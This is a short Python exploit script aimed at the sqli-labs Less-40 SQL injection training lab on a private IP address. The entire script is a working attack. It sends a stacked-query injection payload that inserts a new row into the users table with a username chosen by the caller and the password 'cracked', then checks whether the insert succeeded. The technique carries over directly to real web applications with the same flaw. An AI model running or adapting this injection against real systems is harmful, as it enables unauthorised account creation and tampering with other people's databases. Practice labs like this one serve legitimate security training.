#!/usr/bin/env python

import random
import requests
import re
import string
import sys
import time
import urllib

idx = random.randint(30,500)

banner = '''
USAGE: python %s <New Username>
EXAMPLE: python %s eviluser
''' % (sys.argv[0], sys.argv[0])

if(len(sys.argv) != 2):
    print(banner)
    exit(0)
else:
    pass

url = "http://172.16.214.227/sqli-labs/Less-40/?id="
query = urllib.quote_plus("0'); insert into users(id,username,password) values('%d','%s','cracked')-- " % (idx, sys.argv[1]))
target = url + query

header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "close",
}

print("[*] Query: %s" % query)
res = requests.get(target, headers=header, verify=False)

checkurl = url + str(idx)

res = requests.get(checkurl, headers=header, verify=False)

if(re.search(sys.argv[1], res.text)):
    print("[+] SUCCESS!!")
    print("[*] New User ID is %d." % idx)
else:
    print("[-] Failed.")
